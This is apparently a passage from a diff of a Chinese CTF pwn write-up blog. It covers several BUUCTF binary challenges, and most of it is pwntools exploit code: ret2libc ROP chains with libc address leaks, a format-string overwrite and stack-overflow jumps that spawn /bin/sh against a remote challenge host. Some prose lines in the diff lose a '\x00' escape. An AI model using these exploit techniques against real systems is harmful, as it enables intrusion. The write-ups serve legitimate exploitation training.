class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">sys_libc = libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_libc = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">puts_libc = libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">retn = <span class="number">0x4006B9</span></span><br><span class="line"></span><br><span class="line">sys_addr = puts_addr + (sys_libc - puts_libc)</span><br><span class="line">bin_addr = puts_addr + (bin_sh_libc - puts_libc)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;A&quot;</span>*(<span class="number">80</span> - <span class="number">1</span> + <span class="number">8</span>) + p64(retn) + p64(pop_rid_ret) + p64(bin_addr) + p64(sys_addr) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>还有一种，就是老老实实的按照加密的思路写payload。</p>
 <p>exp3：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    newstr = <span class="built_in">list</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(newstr)):</span><br><span class="line">        c = <span class="built_in">ord</span>(s[i])</span><br><span class="line">        <span class="keyword">if</span> c &lt;= <span class="number">96</span> <span class="keyword">or</span> c &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> c &lt;= <span class="number">64</span> <span class="keyword">or</span> c &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> c &gt; <span class="number">47</span> <span class="keyword">and</span> c &lt;= <span class="number">57</span>:</span><br><span class="line">                    c ^= <span class="number">0xF</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               c ^= <span class="number">0xE</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c ^= <span class="number">0xD</span></span><br><span class="line">        newstr[i] = <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(newstr)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29497</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400B28</span></span><br><span class="line">rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x58</span></span><br><span class="line">payload+=p64(rdi_addr)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(start)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;encrypted&quot;</span>,encrypt(payload))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr = &#x27;</span> + <span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_leak)</span><br><span class="line">libc_base = puts_leak - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&quot;a&quot;</span>*<span class="number">0x58</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload1+=p64(ret)</span><br><span class="line">payload1+=p64(rdi_addr)</span><br><span class="line">payload1+=p64(bin_sh_addr)</span><br><span class="line">payload1+=p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;encrypted&quot;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>还有一种写法，ret2csu也可。</p>
-<h2 id="0x8-OGeek2019-babyrop"><a href="#0x8-OGeek2019-babyrop" class="headerlink" title="0x8.[OGeek2019]babyrop"></a>0x8.[OGeek2019]babyrop</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
+<h2 id="x8.ogeek2019babyrop">0x8.[OGeek2019]babyrop</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>首先要绕过验证：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v2 = sub_804871F(buf);</span><br></pre></td></tr></table></figure>
-
-<p>和上道题一样，可以用\x00来绕过。并且return的v5在buf数组后面，可以写</p>
+<p>和上道题一样，可以用00来绕过。并且return的v5在buf数组后面，可以写</p>
 <p>再之后就是：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">  result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  result = read(<span class="number">0</span>, &amp;buf, a1);</span><br></pre></td></tr></table></figure>
-
 <p>这里的a1就是之前返回的v5（我们在buf后面复写的值），当然是越大越好，所以就0xff * 7</p>
-<p>即：\x00 + 0xff  * 7</p>
+<p>即： + 0xff * 7</p>
 <p>exp1：leak read</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28548</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x7</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露read的got地址</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)+ p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>exp2:leak write</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding=UTF-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28548</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">libc_write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bypass_payload = <span class="string">&#x27;\x00&#x27;</span> <span class="comment">#bypass strncmp() </span></span><br><span class="line">bypass_payload += <span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span> </span><br><span class="line">sh.sendline(bypass_payload)</span><br><span class="line"></span><br><span class="line">offset2ebp = <span class="number">0xe7</span></span><br><span class="line">leak_payload = <span class="string">&#x27;a&#x27;</span>*offset2ebp + <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">leak_payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Correct\n&#x27;</span>,leak_payload)</span><br><span class="line"></span><br><span class="line">leak_write_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">libc_baseaddr = leak_write_addr - libc_write_addr</span><br><span class="line">system_addr = libc_system_addr + libc_baseaddr</span><br><span class="line">binsh_addr = libc_binsh_addr + libc_baseaddr</span><br><span class="line"></span><br><span class="line">sh.sendline(bypass_payload)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*offset2ebp + <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload += p32(system_addr) + <span class="string">&#x27;retn&#x27;</span> + p32(binsh_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Correct\n&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x9-第五空间2019-决赛-PWN5"><a href="#0x9-第五空间2019-决赛-PWN5" class="headerlink" title="0x9.[第五空间2019 决赛]PWN5"></a>0x9.[第五空间2019 决赛]PWN5</h2><p>格式化字符串漏洞</p>
+<h2 id="x9.第五空间2019-决赛pwn5">0x9.[第五空间2019 决赛]PWN5</h2>
+<p>格式化字符串漏洞</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25276</span>)</span><br><span class="line">dword_804C044 = <span class="number">0x804C044</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;dword_804C044:<span class="number">0x1111</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2b bytes:</span><br><span class="line">    &#x27;flag&#123;18b6ca26-1d7d-407b-8b08-63dd66d4e775&#125;\n&#x27;</span><br><span class="line">flag&#123;18b6ca26-1d7d-407b-8b08-63dd66d4e775&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="0xA-get-started-3dsctf-2016"><a href="#0xA-get-started-3dsctf-2016" class="headerlink" title="0xA.get_started_3dsctf_2016"></a>0xA.get_started_3dsctf_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec  get_started_3dsctf_2016 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">gwt@ubuntu:~/Desktop$ file get_started_3dsctf_2016 </span><br><span class="line">get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure>
-
+<h2 id="xa.get_started_3dsctf_2016">0xA.get_started_3dsctf_2016</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec  get_started_3dsctf_2016 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">gwt@ubuntu:~/Desktop$ file get_started_3dsctf_2016 </span><br><span class="line">get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure>
 <p>两个有用的函数：</p>
 <p>main中：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>还有个get_flag：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>本地不能通，看了国外的wp，应该是buu的问题</p>
+<h3 id="方法一">方法一：</h3>
+<p>本地不能通，看了国外的wp，应该是buu的问题</p>
 <p>绕过if判断，直接到flag</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*0x38+p32(0x80489bb)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>或者</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">q = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29154</span>)</span><br><span class="line"><span class="comment">#q = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">56</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line">q.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">q.recv()</span><br></pre></td></tr></table></figure>
-
-<h3 id="方法二：修改内存段的权限"><a href="#方法二：修改内存段的权限" class="headerlink" title="方法二：修改内存段的权限"></a>方法二：修改内存段的权限</h3><p>mprotect函数，可以修改内存段的权限</p>
+<h3 id="方法二修改内存段的权限">方法二：修改内存段的权限</h3>
+<p>mprotect函数，可以修改内存段的权限</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line">addr 内存启始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x80ea000 r-xp    a2000 0      /home/gwt/Desktop/get_started_3dsctf_2016</span><br><span class="line"> 0x80ea000  0x80ec000 rw-p     2000 a1000  /home/gwt/Desktop/get_started_3dsctf_2016</span><br><span class="line"> 0x80ec000  0x80ed000 rw-p     1000 0      </span><br><span class="line"> 0x844a000  0x846c000 rw-p    22000 0      [heap]</span><br><span class="line">0xf7ff6000 0xf7ff9000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7ff9000 0xf7ffb000 r-xp     2000 0      [vdso]</span><br><span class="line">0xff9ba000 0xff9db000 rw-p    21000 0      [stack]</span><br></pre></td></tr></table></figure>
-
 <p>思路：</p>
